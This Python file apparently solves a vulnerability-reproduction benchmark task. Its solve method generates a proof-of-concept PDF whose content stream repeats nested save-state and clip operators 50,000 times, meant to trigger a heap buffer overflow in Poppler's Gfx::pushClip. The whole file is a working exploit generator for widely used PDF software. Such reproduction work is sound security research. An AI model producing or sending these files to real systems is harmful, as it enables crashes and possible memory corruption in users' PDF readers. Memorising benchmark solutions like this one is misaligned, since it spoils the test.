import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in Poppler (Gfx::pushClip).
        The vulnerability allows the nesting depth to step outside the layer/clip stack
        due to a missing check before pushing a clip mark.
        
        The PoC constructs a valid PDF with a content stream containing deeply nested
        save state ('q') and clip ('W') operators.
        """
        
        # Ground truth PoC length is ~825KB.
        # We use a repetitive pattern that pushes a new clip state.
        # Pattern: "q 0 0 1 1 re W n " (18 bytes)
        # 50,000 iterations * 18 bytes = 900,000 bytes, which is close to ground truth
        # and sufficient to overflow typical stack/buffer limits (e.g. 64k).
        
        iterations = 50000
        # q: Save graphics state
        # 0 0 1 1 re: Define a rectangle path (1x1 at 0,0)
        # W: Set clipping path (triggers Gfx::pushClip)
        # n: End path (no stroke/fill)
        payload = b"q 0 0 1 1 re W n " * iterations
        
        # PDF Header
        header = b"%PDF-1.7\n"
        
        # Object 1: Catalog
        obj1 = (
            b"1 0 obj\n"
            b"<< /Type /Catalog /Pages 2 0 R >>\n"
            b"endobj\n"
        )
        
        # Object 2: Pages
        obj2 = (
            b"2 0 obj\n"
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
            b"endobj\n"
        )
        
        # Object 3: Page
        obj3 = (
            b"3 0 obj\n"
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R >>\n"
            b"endobj\n"
        )
        
        # Object 4: Content Stream
        # The Length must be accurate for the parser to read the full stream.
        obj4_header = b"4 0 obj\n<< /Length " + str(len(payload)).encode() + b" >>\nstream\n"
        obj4_footer = b"\nendstream\nendobj\n"
        
        # Trailer
        # We provide a dummy trailer. Poppler is robust and will rebuild the XREF if missing/invalid,
        # processing the objects found in the scan.
        trailer = (
            b"xref\n"
            b"0 5\n"
            b"0000000000 65535 f \n"
            b"0000000010 00000 n \n"
            b"0000000060 00000 n \n"
            b"0000000110 00000 n \n"
            b"0000000200 00000 n \n"
            b"trailer\n"
            b"<< /Size 5 /Root 1 0 R >>\n"
            b"%%EOF\n"
        )
        
        return header + obj1 + obj2 + obj3 + obj4_header + payload + obj4_footer + trailer